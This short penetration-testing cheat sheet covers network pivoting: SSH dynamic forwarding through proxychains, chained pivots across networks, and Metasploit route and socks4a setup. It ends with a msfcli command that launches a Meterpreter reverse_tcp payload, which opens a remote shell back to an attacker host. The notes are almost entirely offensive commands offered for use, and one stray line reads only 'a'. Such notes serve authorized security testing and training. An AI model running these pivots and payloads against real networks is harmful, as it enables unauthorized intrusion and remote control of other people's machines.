# SSH Pivoting:

    - ssh -D 127.0.0.1:1080 -p 22 user@IP
    - Add socks4 127.0.0.1 1080 in /etc/proxychains.conf
    - proxychains commands target

  ### Pivoting to One Network to Another:
    - ssh -D 127.0.0.1:1080 -p 22 user1@IP1
    - Add socks4 127.0.0.1 1080 in /etc/proxychains.conf
    a
    - proxychains ssh -D 127.0.0.1:1081 -p 22 user1@IP2
    - Add socks4 127.0.0.1 1081 in /etc/proxychains.conf
    - proxychains commands


   ### Pivoting Using metasploit:
    - route add 10.1.1.0 255.255.255.0 1
    - route add 10.2.2.0 255.255.255.0 1
    - use auxiliary/server/socks4a
    - run
    - proxychains msfcli windows/* PAYLOAD=windows/meterpreter/reverse_tcp LHOST=IP LPORT=443 RHOST=IP E
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Pivoting%20Techniques.md
